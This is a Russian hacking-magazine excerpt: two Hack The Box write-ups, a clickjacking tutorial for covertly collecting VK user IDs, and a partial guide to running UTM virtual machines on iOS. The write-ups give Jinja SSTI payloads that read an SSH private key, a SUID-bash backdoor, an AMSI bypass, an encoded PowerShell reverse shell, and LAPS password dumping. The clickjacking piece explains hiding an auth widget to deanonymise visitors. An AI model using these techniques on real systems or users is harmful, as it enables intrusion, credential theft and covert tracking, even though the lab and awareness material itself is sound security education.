                        только через VPN. Не делай этого с компьютеров,
                       где есть важ ные для тебя данные, так как ты ока -
                    жешься в общей сети с дру гими учас тни ками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.156    late.htb

И запускаем сканирование портов.




Сканирование портов — стан дартный первый шаг при любой атаке. Он поз-
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инстру мент для сканирования — это Nmap. Улучшить
резуль таты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f
 1 | tr '\n' ',' | sed s/, $/ / )
 nmap -p$ports -A $1


Он действу ет в два этапа. На первом производит ся обычное быстрое сканиро-
вание, на втором — более тщатель ное сканирование, с исполь зованием име-
ющихся скриптов (опция -A).





                     Резуль тат работы скрипта

Находим всего два откры тых порта:
 • 22 — служба OpenSSH 7.6p1;
 • 80 — веб-сервер Nginx 1.14.0.

Бру тить SSH смысла нет, поэтому начинаем исследование с веб-сервера.




Посколь ку вначале у нас нет учет ных дан ных, нет и смысла изу чать службы,
которые всег да требуют авторизации (например, SSH). Единствен ное, что мы
можем делать здесь, — это перебирать пароли брут форсом, но машины с HTB
почти всег да можно пройти по-дру гому. В жизни таких вариантов может
не быть, к тому же есть шан сы подобрать пароль или получить его при помощи
социаль ной инженерии.


Заг лянем на сайт через браузер.





                   Главная страница сайта http://late.htb


ÒÎ×ÊÀ ÂÕÎÄÀ
На сайте видим всего две страницы: Home (текущая) и Contact. Попробу ем
поискать скры тый кон тент.




Од но из первых действий при тестировании безопасности веб-приложения —
это  сканирование методом  перебора  каталогов,  чтобы  найти  скры тую
информацию и недоступные обычным посетителям фун кции. Для этого можно
исполь зовать прог раммы вроде dirsearch и DIRB.
  Я пред почитаю лег кий и очень быстрый ﬀuf . При запуске указываем сле-
дующие парамет ры:
 • -w — словарь (я исполь зую словари из набора SecLists);
 • -t — количество потоков;
 • -u — URL;
 • -fc — исключить из резуль тата ответы с кодом 403.



Запускаем ffuf:


ffuf -u 'http://late.htb/FUZZ' -t 256 -w directory_2.3_medium_
lowercase.txt



            Резуль тат сканирования каталогов с помощью ﬀuf

Снова ничего интересного. Тог да перейдем к сканированию файлов HTML
(ведь нас встретили имен но такие статические страницы):


ffuf -u 'http://late.htb/FUZZ.html' -t 256 -w directory_2.3_
medium_lowercase.txt




          Резуль тат сканирования HTML-файлов с помощью ﬀuf

И снова ничего нового. Тог да я решил просмотреть исходники страниц и сразу
обнаружил в тек сте ссылку, ведущую на дру гой под домен!





                        Ссылка в тек сте




                       Новый под домен

Найден ный под домен добавим в файл /etc/hosts и заг лянем на расположен -
ный там сайт.


10.10.11.156 late.htb images.late.htb





                Главная страница сайта http://images.late.htb

Нас встречает преобразователь изображений в текст, написан ный с исполь -
зованием Flask, а это значит, что нужно сразу проверить наличие уязвимостей
SSTI.


ÒÎ×ÊÀ ÎÏÎÐÛ
Я решил отправить первое попавшееся под руку изображение, чтобы пос-
мотреть, как работает этот кон вертер, и в ответ получил запрос на сохранение
файла. Файл содержал весь текст с отправленного изображения, зак лючен ный
в тег <p>.





            От правленное изображение и скачан ный файл


Îò SSTI ê RCE
Раз мы можем управлять кодом на странице, попробу ем проэксплу атировать
SSTI.




Server-side template injection (SSTI), или инъекция шаблонов на стороне сер-
вера, — это механизм атаки, при котором злоумыш ленник внед ряет в шаблон
вредоносный код. Шаблоны нужны веб-разработ чикам, чтобы можно было
настраивать внеш ний вид сайта толь ко в одном месте и затем не копировать
вручную. По сути, шаблон — это документ HTML, где в нужных местах отме-
чены перемен ные и коман ды, которые при генерации итоговой страницы будут
заменены дан ными. В том числе это могут быть и дан ные, получен ные
от посетителя сайта.
   Атака зат рагивает момент, ког да присланная информация объединяет ся
с шаблоном. Злоумыш ленник формиру ет строку таким образом, чтобы она
не просто под ставилась в шаблон, но была интерпретирована как код. Если
это возможно, то он добавит свои дирек тивы, с помощью которых выполнит
эксфиль трацию дан ных или даже захват веб-сервера.


В качестве теста уязвимости SSTI я отправил {{7*7}}. Если сервер уязвим, он
выполнит это выражение и вернет нам резуль тат. Я написал эту последова-
тель ность в тек стовом редак торе, сделал скрин шот и отправил его.





                          Тест уязвимости SSTI

Видим, что сервер уязвим к внед рению шаблонов. Не выполняя обычные
перечисления, я решил сразу попробовать получить RCE. Давай получим
резуль тат выполнения коман ды id. Для этого импортируем модуль os. Снова
пишем весь код в редак торе, делаем скрин шот, отправляем изображение
и получаем информацию о текущем кон тек сте работы.


${{ config.__class__.from_envvar.__globals__.import_string("os").
popen("id").read() }}





                  Резуль тат выполнения коман ды id

RCE есть, теперь нужно получить стабиль ный доступ к хосту. Не будем сразу
пытать ся пробросить реверс-шелл, а сначала запросим приват ный ключ поль -
зователя svc_acc, что даст нам возможность под ключить ся по SSH.


${{ config.__class__.from_envvar.__globals__.import_string("os").
popen("cat /home/svc_acc/.ssh/id_rsa").read() }}





                   Приват ный ключ поль зователя

Есть приват ный ключ. Копиру ем его в отдель ный файл, назначаем права
коман дой chmod 0600 id_rsa, затем под ключаем ся по SSH и забираем флаг
поль зователя.





                        Флаг поль зователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ
Теперь, ког да мы получили доступ к хосту, нам необходимо собрать информа-
цию. Заг рузим на хост скрипт PEASS, запустим его и посмотрим, что он най-
дет.




Что делать после того, как мы получили доступ в систему от имени поль зовате-
ля? Вариантов даль нейшей эксплу атации и повышения привилегий может быть
очень много, как в  Linux, так и в Windows. Чтобы собрать информацию
и наметить цели, можно исполь зовать Privilege Escalation Awesome Scripts
SUITE (PEASS) — набор скриптов, которые проверяют систему на автомате.
   Чтобы восполь зовать ся скриптом, его нужно сначала заг рузить на локаль -
ный хост.


 wget https://github.com/carlospolop/PEASS-ng/releases/latest/
 download/linpeas.sh -O /tmp/linpeas.sh


Затем с помощью встроенных средств SSH заг ружаем скрипт на удален ный
хост, назначаем ему права и выполняем.


 scp -i id_rsa /tmp/linpeas.sh svc_acc@late.htb:/tmp/
 chmod +x /tmp/linpeas.sh
 /tmp/linpeas.sh





                     Резуль тат работы скрипта

Мы узнали, что в нашем владении — скрипт /usr/local/sbin/ssh-alert.sh.
Посмотрим, для чего он нужен.





                Содержимое скрипта ssh-alert.sh

Этот скрипт уведом ляет, что обнаружен логин по SSH, и отправляет руту сооб-
щение с помощью sendmail. Так как мы владель цы этого файла, мы можем
внести в него изменения. Давай посмотрим, что приводит к его запуску.
   Для отслеживания запускаемых процессов в системе будем исполь зовать
утилиту pspy64 . Заг рузим ее на хост тем же способом, которым заг ружали
linpeas, а потом выполним. Посколь ку найден ный скрипт сообщает о под клю-
чении по SSH, в дру гом терминале под ключим ся по SSH, а затем отключим ся.





                 Логин и логаут SSH и логи pspy64

В выводе находим отображение запуска найден ного скрипта, но, что более
интересно, он запускает ся в кон тек сте поль зователя с UID=0, а это root. Таким
образом, мы можем написать в скрипт свои коман ды, которые будут выпол-
нены в привилегирован ном кон тек сте.
  В качестве метода зак репления давай назначим файлу коман дной оболочки
бит SUID.




Ког да у файла установлен атрибут setuid (S-атрибут), обычный поль зователь,
запускающий этот файл, получает повышение прав до поль зователя — вла-
дель ца файла в рам ках запущен ного процесса. После получения повышен ных
прав приложение может выполнять задачи, которые недоступны обычному
поль зователю. Из-за возможности состояния гон ки многие операционные сис-
темы игнориру ют S-атрибут, установленный shell-скриптам.



echo "chmod u+s /bin/bash" >> ssh-alert.sh

Теперь снова зайдем по SSH, сразу же выйдем и проверим права на файл.




                     Права на файл /bin/bash

S-бит установлен, и мы можем изменить кон текст поль зователя и забрать флаг
рута.


/bin/bash -p





                            Флаг рута

Машина захвачена!
ВЗЛОМ





              АТАКУЕМ
    WINDOWS REMOTE MANAGEMENT
    И РАБОТАЕМ С СЕРТИФИКАТАМИ




В этом рай тапе мы с тобой взло маем лег -
кую  по  уров ню  сложности  машину
на Windows: порабо таем с сер тифика тами
для службы WinRM, а так же с LAPS — что бы
повысить при вилегии.                                                RalfHacker                                                                                          hackerralf8@gmail.com



                     Под ключаться к машинам с HTB рекомендует ся
                        только через VPN. Не делай этого с компьютеров,
                       где есть важ ные для тебя данные, так как ты ока -
                    жешься в общей сети с дру гими учас тни ками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Добавляем IP-адрес машины в /etc/hosts, чтобы было удобнее обращать ся
к ней:


10.10.11.152    timelapse.htb

И запускаем сканирование портов.




Сканирование портов — стан дартный первый шаг при любой атаке. Он поз-
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инстру мент для сканирования — это Nmap. Улучшить
резуль таты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f
 1 | tr '\n' ',' | sed s/, $/ / )
 nmap -p$ports -A $1


Он действу ет в два этапа. На первом производит ся обычное быстрое сканиро-
вание, на втором — более тщатель ное сканирование, с исполь зованием име-
ющихся скриптов (опция -A).





                     Резуль тат работы скрипта

Мы наш ли много откры тых портов:
 • 53 — служба DNS;
 • 88 — служба авторизации Kerberos;
 • 135 — служба удален ного вызова процедур (Microsoft RPC);
 • 139 — служба имен NetBIOS;
 • 389, 636, 3268, 3269 — служба LDAP;
 • 445 — служба SMB;
 • 464 — служба смены пароля Kerberos;
 • 593 — служба удален ного вызова процедур (Microsoft RPC над HTTPS);
 • 5986 — служба удален ного управления Windows (WinRM).


Ïîðò 445 — SMB
Сразу проведем базовую разведку SMB. Простым под ключением с помощью
CrackMapExec узнаем версию операционной системы и имя хоста.


cme smb 10.10.11.152



               Под ключение с помощью CrackMapExec

Так же стоит попробовать под ключение от имени гостя (аноним ную авториза-
цию).


cme smb 10.10.11.152 -u guest -p '' --shares





                   Общие SMB-ресурсы

И находим доступную для чтения дирек торию Shares.


ÒÎ×ÊÀ ÂÕÎÄÀ
Под ключим ся к этому ресурсу с помощью утилиты smbclient из пакета скрип-
тов impacket и просмотрим доступные файлы (при запросе пароля ничего
не вводим).


smbclient.py guest@10.10.11.152
use Shares
ls





                  Содержимое ресурса Shares

В каталоге Dev найдем архив ZIP.


cd Dev
ls





                   Содержимое каталога Dev

Скачиваем его коман дой get, а при попыт ке распаковать у нас запросят
пароль.





                          Распаковка архива

Пароль не проблема,  если он  слабый,  так  как  его можно перебрать.
Для перебора будем исполь зовать утилиту fcrackzip.


fcrackzip -v -D -u winrm_backup.zip -p rockyou.txt





                     Резуль тат под бора пароля

В архиве находим файл .pfx — сертификат в формате PKCS#12. При попыт ке
открыть и просмотреть его у нас снова запрашивают пароль.





                   Резуль тат просмотра PFX-файла


ÒÎ×ÊÀ ÎÏÎÐÛ
Бу дем надеять ся, что и тут исполь зует ся слабый пароль. Можно преобразовать
файл в формат прог раммы John the Ripper — прод винутого брут форсера
хешей. Вместе с «Джоном» обычно поставляется репозиторий скриптов
для преобразования хешей из разных форматов файлов в понимаемый брут -
форсером формат. В дан ном слу чае нам нужен скрипт pfx2john.


/usr/share/john/pfx2john.py legacyy_dev_auth.crt





                  Резуль тат преобразования файла

Сохраним хеш в файл и передадим на перебор. В качестве словаря будем
исполь зовать знаменитый rockyou .


john --wordlist=./rockyou.txt pfx.hash





                     Резуль тат перебора хеша

Теперь, ког да мы получили пароль от сертификата PFX, нам нужно извлечь
из него отдель но сертификат и отдель но ключ. Для этого восполь зуем ся ути-
литой OpenSSL , которой нужно указать:
 • формат файла и сам вход ной файл (параметр -in);
 • имя файла, в который записать резуль тат (параметр -out );
 • парамет ры (для ключа -nocerts , а для получения сертификата -clcerts
   и -nokeys).


openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem
-nodes





                       Получение ключа


openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out
cert.crt -nodes





                    Получение сертификата

Теперь нам нужно очистить файлы ключа и сертификата. Для этого оставим
в файлах толь ко дан ные после -----BEGIN. Теперь у нас все готово, чтобы
под ключить ся к службе WinRM по сертификату. Для этого исполь зуем кру тую
утилиту Evil-WinRM .


evil-winrm -S -k ./clear_key.pem -c ./clear_cert.crt -i 10.10.11.
152





                        Флаг поль зователя


ÏÐÎÄÂÈÆÅÍÈÅ
Первым делом получим информацию о текущем поль зователе. Это поможет
более точно понять кон текст, в котором мы работаем.


whoami /all





               Ин формация о текущем поль зователе

Таким образом, под кон троль ный нам поль зователь состоит в группе разработ -
чиков. Никаких проектов на диске найти не удалось, поэтому посмотрим логи
PowerShell, а имен но вот этот history-файл:


C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\Powershell\
PSReadLine\ConsoleHost_history.txt





                 Просмотр истории команд PowerShell

Из этого файла мы получаем учет ные дан ные для под ключения от имени поль -
зователя svc_deploy.


$so = New-PSSessionOption -SkipCACheck -SkipCNCheck
-SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV'
-AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential (
'svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986
-usessl -SessionOption $so -scriptblock {whoami}




        Вы полнение коман ды от имени поль зователя svc_deploy

Мы  можем  получить  дру гой  кон текст  выполнения,  поэтому  прокинем
реверс-шелл. Но  сначала  нужно  отключить  AMSI,  сделать  это можно
с помощью встроенного в Evil-WinRM средства Bypass-4MSI .


menu
Bypass-4MSI





                              Патч AMSI

Реверс-шелл возь мем с кру того он лайнового генератора, где нужно указать
хост и порт для обратного под ключения. Кроме реверс-шелла, получим
и коман ду для листенера:


rlwrap -cAr nc -lnvp 4321





                     Генерирование реверс-шелла

А теперь выполняем наш реверс-шелл.


$so = New-PSSessionOption -SkipCACheck -SkipCNCheck
-SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV'
-AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential (
'svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986
-usessl -SessionOption $so -scriptblock { powershell -e JABjAGw...
 }





                     Бэк коннект от имени svc_deploy


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ
Так как рабочий кон текст изменился, снова запросим информацию о поль -
зователе.


whoami /all





                  Ин формация о поль зователе

Поль зователь состоит в группе LAPS_Readers, что позволяет ему читать свой-
ства объектов, связан ных с LAPS.




Local  Administrator  Password  Solution  (LAPS)  позволяет  цен трализован но
управлять паролями администраторов на всех компь ютерах домена и хранить
информацию о пароле и дате его смены непосредствен но в объектах типа
Computer в Active Directory. LAPS основан на исполь зовании специаль ных фун -
кций GPO, которые, в свою очередь, основаны на Group Policy Client Side
Extension. Это неболь шой модуль, который устанавливается на рабочие стан -
ции. Это расширение GPO исполь зует ся для генерации уникаль ного пароля
локаль ного администратора на каждом компь ютере домена. Пароль админис-
тратора автоматически меняется с указан ной периодичностью (по умолчанию
каждые 30 дней). Значение текущего пароля хранит ся в кон фиден циаль ном
атрибуте ms-Mcs-AdmPwd учет ной записи компь ютера в Active Directory, доступ
на просмотр содержимого атрибута регулирует ся группами безопасности AD.



На компь ютере установлен модуль PowerShell Active Directory, поэтому мы
можем получить значение ms-Mcs-AdmPwd одной простой коман дой.


Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd,
ms-Mcs-AdmPwdExpirationTime





            Получение пароля локаль ного администратора

Мы узнали пароль локаль ного админа, поэтому можем под ключить ся к службе
WinRM.


evil-winrm -S -u 'Administrator' -p '0[haC+zxJ+Tq)+;a)1DU9qG#' -i
10.10.11.152





                            Флаг рута

Машина захвачена!
ПРИВАТНОСТЬ





       КАК ХАКЕРЫ ИСПОЛЬЗУЮТ
         КЛИКДЖЕКИНГ ДЛЯ
        ДЕАНОНИМИЗАЦИИ





В этой статье я расска жу, как зло умыш -
ленник может использовать технику соци -
ального фишин га под наз вани ем клик дже-
кинг,  что бы  деано ними зиро вать  поль-
зователя. В качестве при мера мы будем             DigitalScout                                                                    Мой канал с инструментами,
изу чать ата ку на акка унт VK и посмотрим,       методами и статьями о                                                                                                    digital-разведке:
как имен но  хакер может  узнать иден -       https://t.me/Digitalntelligence
тифика тор пользователя. Это очень опас-
ный вид ата ки, который сложно предот -
вра тить, и попасться на него может каж-
дый.




                       Статья имеет озна коми тельный характер и приз-
                       вана предос теречь от опас ности непредна мерен-
                        ного разгла шения лич ных данных. Автор и редак-
                      ция не несут ответс твенности за любой вред,
                      при чиненный   с   при менением   изложенной
                     информа ции.



×ÒÎ ÒÀÊÎÅ ÊËÈÊÄÆÅÊÈÍÃ

Клик джекинг — это механизм обмана, связан ный с размещением на сайте
невидимых элемен тов, с которы ми поль зователь может взаимодействовать,
даже не подозревая этого. То есть создает ся кнопка и в невидимом слое нак -
ладывается поверх дру гой — видимой. Например, жертва хочет посмотреть
фильм на сайте, жмет Play, а попут но еще слу чайно дает «сог ласие на обработ -
ку персональ ных дан ных». Найти такие невидимые элемен ты можно, толь ко
заг лянув в код сайта.
  Бы вает еще и «курсорджекинг». Это незамет ное перемещение курсора
мыши, чтобы выполнить те или иные действия на странице. Перемещать ся
вместе с курсором может и какой-то элемент.
   Даль ше я покажу, как злоумыш ленник может добавить на страницу вид жет
«ВКон такте», сделать его невидимым и под ложить ничего не подозревающему
поль зователю.


ÄÈÇÀÉÍ ÑÀÉÒÀ

Здесь  злоумыш ленник может нафан тазировать  что  угод но. Социаль ный
фишинг — ничто без социаль ной инженерии, поэтому пот ребу ется схема вве-
дения в заблуждение, под которую уже будет под гонять ся содержимое сайта.
   Для примера возь мем пустой шаблон.


<!DOCTYPE html> <!-- Объявление формата документа -->
<html>
<head> <!-- Техническая информация о документе -->
<meta charset="UTF-8"> <!-- Определение кодировки символов -->
<title> ... </title> <!-- Заголовок документа -->
<link rel="stylesheet" type="text/css" href="style.css"> <!--
Подключение внешней таблицы стилей -->
<script src="script.js"></script> <!-- Подключение сценариев -->
</head>
<body> <!-- Основная часть документа -->
</body>
</html>


ÀÂÒÎÐÈÇÀÖÈß VK

Теперь на сайт добавляет ся возможность авторизовать ся через VK. Для этого
есть официаль ный API, к нему идет под робная инструк ция.
   Если вкрат це, то достаточно добавить вот этот скрипт в сек цию head:


<script src="https://vk.com/js/api/openapi.js?169" type="text/
javascript"></script>

И вот это — в body:


<div id="vk_auth"></div>
<script type="text/javascript"> window.onload = function () { VK.
init({apiId:1111111});
VK.Widgets.Auth('vk_auth', {});
}
</script>

Парамет ру apiId нужно дать значение, которое находит ся в докумен тации
и есть в разделе «Код вид жета для вставки на сайте».





На скрине замазан сам иден тификатор. Теперь на сайте должна появить ся
такая кнопка.





У злоумыш ленника есть широкий выбор вариантов того, как переправлять себе
дан ные об авторизован ных посетителях. На стороне сервера для этого может
исполь зовать ся база дан ных или просто тек стовый файл.
   Как сказано в докумен тации, после авторизации метод VK.Widgets.Auth
возвращает дан ные о поль зователе в виде GET-парамет ров URL при исполь -
зовании authUrl или в виде парамет ров фун кции при исполь зовании onAuth.
Возвращают ся следующие поля:
 • uid (integer) — иден тификатор поль зователя;
 • first_name (string) — имя;
 • last_name (string) — фамилия;
 • photo (string) — URL фотог рафии профиля поль зователя шириной 200 px;
 • photo_rec (string) — URL фотог рафии профиля поль зователя шириной 50
   px;
 • hash (string) — слу жебный параметр, необходимый для проверки авто-
   ризации на удален ной стороне.

Для проверки авторизации можно исполь зовать получен ный параметр hash,
сравнивая его со значением фун кции MD5  от app_id  +  user_id  +
secret_key. Например:


md5(667481942537fTanpCrNSeuGPbA4ENCo)

Как настраивать этот вид жет, есть многочисленные инструк ции, здесь никаких
сек ретов, разобрать ся под силу каждому. Так что идем даль ше.


ÍÀÑÒÐÎÉÊÀ ÂÈÄÈÌÎÑÒÈ

Обычный веб-разработ чик на этом этапе бы и остановился, но злоумыш ленни-
ку нужно сделать кнопку авторизации невидимой и вставить поверх нее
какое-нибудь привлекатель ное изображение,  чтобы поль зователь прошел
авторизацию, не заметив этого. Например, можно поставить поверх какую-то
дру гую кнопку.
   Если в любом браузере выбрать «Просмотр кода» и навести курсор мыши
на кнопку входа в VK, а затем щелкнуть правой кнопкой, то можно найти такой
абзац (на скрин шоте замазана часть тек ста, которой на этом этапе не будет).





Теперь в окне CSS можно добавить opacity: 0.0. Кнопка станет невидимой.





Код абзаца уже со значением opacity: 0.0 можно скопировать и получить
код скры той кнопки. В таком виде злоумыш ленник и добавляет кнопку на свой
сайт вместо прежнего кода.


ÂÛÂÎÄÛ

Получается невидимая кнопка, и при нажатии на нее выполняет ся действие.
Кстати, если просто скрыть этот элемент атрибутом hidden, то никакого
резуль тата не будет, ведь кнопка не толь ко пропадет визу аль но, но и не будет
получать событий вроде щелчка кнопкой мыши.
   Это, по моему мнению, крайне эффективный способ деанонимизации, ког -
да поль зователя достаточно направить на страницу — и можно получить его
иден тификатор VK и некоторые дру гие дан ные. Работает же такая схема прак -
тически незамет но для обы вателя.
  Защитить ся от такого способа крайне сложно. Можно разве что поискать
в исходнике подозритель ного сайта слово opacity, но вряд ли кто-то будет
делать это на каждой посещаемой странице.
ТРЮКИ





    ИСПОЛЬЗУЕМ ВИРТУАЛКУ UTM ДЛЯ
      УСТАНОВКИ WINDOWS НА IOS





Ты хотел бы поиг рать в игры под Windows
на сво ем айфо не? Или запустить macOS
на iPad? А может, ты меч таешь поставить
на  эти  устрой ства  Android  или  Linux?
Это воз можно! Ска жешь, мы сош ли с ума?       Валентин Холмогоров                                                                            Ведущий редактор
А вот и нет: в iOS можно соз давать вир -         valentin@holmogorov.ru
туальные машины с раз ными операци -
онны ми системами. Для это го раз работа -
но специальное при ложение под наз вани -
ем UTM. Сегод ня мы погово рим о том,
как уста новить эту прог рамму на твой
iPhone или iPad и как ее использовать.


×ÒÎ ÒÀÊÎÅ UTM?

К виртуалкам вроде VirtualBox или VMware все уже давным-давно привык ли:
подобные инстру мен ты существу ют для боль шинства современ ных «настоль -
ных» операционок. В iOS до недавнего времени средств виртуализации
не было и в помине (по крайней мере, широкая публика о них ничего не знала).
И вот — свершилось: для мобиль ных устройств Apple наконец-то появился
полноцен ный инстру мент виртуализации, под держивающий к тому же боль шое
число процессорных архитек тур.
  UTM может работать без джейлбрейка на iOS 11, 12 и 13, а так же на устрой-
ствах  с  чипом  А12  под  управлением  операционной  системы  вер-
сий 14.2 и 14.3. При этом придет ся исполь зовать сертификат разработ чика,
посколь ку UTM устанавливается не из официаль ного магазина App Store, а из
сторон него хранилища AltStore. Как известно, бесплат ные сертификаты раз-
работ чиков для iOS должны перепод писывать ся каждые семь дней, и AltStore
автоматизиру ет этот процесс. Джейлбрейк необходим толь ко для запуска при-
ложения на iOS 14 старших версий, при этом сами создатели UTM рекомен -
дуют исполь зовать Jitterbug или AltJIT для установки приложения.
  Виртуаль ная машина UTM под держивает более 30 процессоров, включая
х86_64, RISC-V и ARM64. В основе UTM лежит код QEMU. Посколь ку в устрой-
ствах iOS отсутству ет под держка аппарат ной виртуализации, вместо ускорите-
ля KVM разработ чики исполь зовали TCG, который выполняет динамическую
тран сляцию кода и JIT-ком пиляцию. На прак тике это означает, что даже ARM-
код для запуска в UTM должен пред варитель но ком пилировать ся в JIT, а это
замет но снижает производитель ность приложений. Кроме того, посколь ку вир-
туализация GPU не под держивает ся, отсутству ют DirectX и OpenGL, что огра-
ничивает запуск боль шинства современ ных игр под Windows. Однако приложе-
ния и игры, не требующие под держки графики, под этим эму лятором пойдут.


ÓÑÒÀÍÎÂÊÀ

Íà óñòðîéñòâî ñ äæåéëáðåéêîì
Если на твоем iPhone или iPad имеется джейлбрейк, установка UTM не пред -
ставляет ни малейших сложностей. Для начала необходимо скачать и пос-
тавить на устройство приложение AppSync Unied, которое можно получить
из репозитория https://cydia.akemi.ai. Для этого открой Cydia, нажми
кнопку «Источники» в нижней части окна, затем над пись «Правка» в правом
верхнем  углу. Теперь над пись «Добавить» слева вверху — введи URL
https://cydia.akemi.ai в открывшемся окне и нажми «Добавить». После
этого в списке источников перейди в толь ко что под ключен ный репозиторий
Karen’s Repo и установи из него приложение AppSync Unied.
  Затем аналогичным образом под ключи в Cydia репозиторий https://
cydia.getutm.app/ и установи из него само приложение UTM.





                    Установка AppSync Unied и UTM


Íà óñòðîéñòâî áåç äæåéëáðåéêà
Установка UTM в iOS без джейлбрейка выг лядит чуть сложнее, но толь ко
на первый взгляд. Пот ребу ется установить на твоем айфоне AltStore. Делается
это вкрат це так: установи на компь ютере последние версии iTunes и iCloud,
затем скачай с сайта altstore.io прог рамму AltServer — для ее исполь зования
необходима как минимум Windows 10.
  Под ключи iPhone к компь ютеру, зак рой iTunes, щелкни в системном трее
на значке AltServer и выбери Install AltStore → Имя твоего устройства. AltStore
попросит тебя ввести дан ные Aple ID — для этого лучше зарегистрировать
новую учет ку, причем в популярных инструк циях совету ют указывать в качестве
локации острова Херд и Мак дональд, остров Норфолк или Южная Георгия
и Южные Сан двичевы острова.





                          Установка AltStore

После этого на iPhone нужно открыть настройки, перейти в раздел «Основные
→ Профили и управление устройством → твой Apple ID → Доверять». Останет ся
толь ко запустить AltStore, открыть окно Settings, выбрать Sign in with Apple ID,
после чего следует ввести адрес элек трон ной почты, привязан ный к созданно-
му ранее Apple ID, и пароль.
   Теперь в настройках AltStore нужно под ключить репозиторий https://alt.
getutm.app и установить UTM отту да. В качестве аль тернативного варианта
можно сначала скачать UTM в виде файла .ipa с GitHub на компь ютер, а потом
установить его на мобиль ное устройство с помощью AltStore, не забыв под -
писать его цифровой под писью.


ÑÎÇÄÀÍÈÅ ÂÈÐÒÓÀËÜÍÎÉ ÌÀØÈÍÛ

Если ты  ког да-либо поль зовался  VirtualBox, создание новой виртуаль ной
машины в UTM не вызовет у тебя никаких зат руднений. После запуска при-
ложения нажми на плюсик в правом верхнем углу экрана. В поле Name введи
произволь ное имя виртуаль ной машины, в списке Architecture выбери архитек -
туру процессора из пред ложен ных вариантов. С полем System чуть сложнее:
QEMU, лежащий в основе UTM, эму лиру ет не толь ко процессор, но и целую
аппарат ную под систему на его основе. Список под держиваемых QEMU систем
и отображается в этом меню. В боль шинстве слу чаев можно не менять пред -
ложен ный по умолчанию вариант: он оптимален для выбранной архитек туры
процессора.
  Вы бери объем памяти для виртуаль ной машины в меню Memory (он, естес-
твен но, не может превышать доступный объем оперативки на самом устрой-
стве). Наконец, в списке Setup Drives/Images нужно настроить диск, с которого
будет заг ружать ся твоя виртуаль ная машина. UTM под держивает формат
QCOW2.
  Меню Image Location — это не расположение файла образа диска, как мож-
но было бы подумать, а способ мон тирования образа. Для эму ляции компь -
ютера рекомен дует ся выбрать стан дартный вариант IDE, для устройств ARM
доступен вариант virtio. При желании ниже на этом же экране можно изме-
нить пред ложен ные по умолчанию настройки дисплея виртуалки и способы
ввода — виртуаль ную клавиату ру и эму ляцию мыши.





                Создание виртуаль ной машины в UTM

Ког да настройка будет завершена, миниатюра виртуаль ной машины появит ся
на главном экране приложения. Чтобы запустить ее, достаточно тапнуть
на этом эскизе. Если к виртуалке, например, под цеплен образ диска с установ-
ленной ОС, начнется ее заг рузка.





                    Виртуаль ная машина готова


ÓÏÐÀÂËÅÍÈÅ ÂÈÐÒÓÀËÜÍÎÉ ÌÀØÈÍÎÉ

В верхней части экрана работающей виртуаль ной машины имеется специаль -
ная панель, содержащая восемь кнопок. Первые три позволяют вык лючить,
поставить  на  паузу  или  перезапустить  виртуалку.  Нажатие  следующих
по поряд ку кнопок разворачивает виртуаль ную машину на весь экран, откры -
вает или, наоборот, прячет экранную клавиату ру, а так же вызывает окно нас-
троек портов и дисков виртуаль ной машины. Наконец, нажатием крайней пра-
вой кнопки можно убрать эту панель с экрана. Как видишь, ничего сложного —
этого миниму ма инстру мен тов вполне достаточно для того, чтобы управлять
виртуалкой. Правда, на экране iPhone 7 кнопки выг лядят мелковато, а вот
на iPad, думаю, будут в самый раз.


ÈÑÏÎËÜÇÎÂÀÍÈÅ ÃÎÒÎÂÛÕ ÎÁÐÀÇÎÂ ÂÌ

На странице https://mac.getutm.app/gallery/ пред ставлено несколь ко виртуаль -
ных машин UTM с уже установленной операционной системой. Среди них —
ArchLinux ARM, Debian 10.4, Mac OS 9.2.1 для PowerPC, ReactOS 0.4.14, Sun
Solaris 9 для архитек туры SPARC и Ubuntu 14.04. Все осталь ные перечис-
ленные на этом сайте ОС требуют дополнитель ной установки и наличия дис-
трибутива (как в слу чае с Windows). Я попытался открыть веб-страничку с соот -
ветству ющим образом по ссылке со страницы https://mac.getutm.app/gallery/,
скачать образ виртуаль ной машины на телефон и нажать на кнопку Open
in UTM, но получил ошибку — ни одна из виртуалок таким образом на моем
айфоне не запустилась.
  Приш лось идти дру гим, более сложным путем: восполь зовать ся файловым
менед жером  Filza. Образ виртуаль ной машины скачивается с упомяну того
выше сайта в виде ZIP-архива и сохраняется на айфоне в дирек торию \var\
mobile\documents. Содержащу юся  в этом  архиве папку нужно извлечь
с  помощью   Filza  и  скопировать  в  папку  \user\containers\data\
applications\utm\documents,  где по умолчанию  хранят ся  виртуаль ные
машины UTM. После этого виртуалка появит ся в главном окне UTM и машину
можно будет запустить тапом на ее миниатюре.





             Виртуаль ная машина Sun Solaris на iPhone 7

Од нако вариант с Filza годит ся, толь ко если на твоем устройстве есть джей-
лбрейк, по-дру гому этот файловый менед жер ты установить не сможешь.
Но  есть  аль тернативный способ!  Работает  это  так:  скачиваем  с сайта
https://mac.getutm.app/gallery/ виртуаль ную машину на компь ютер, распаковы -
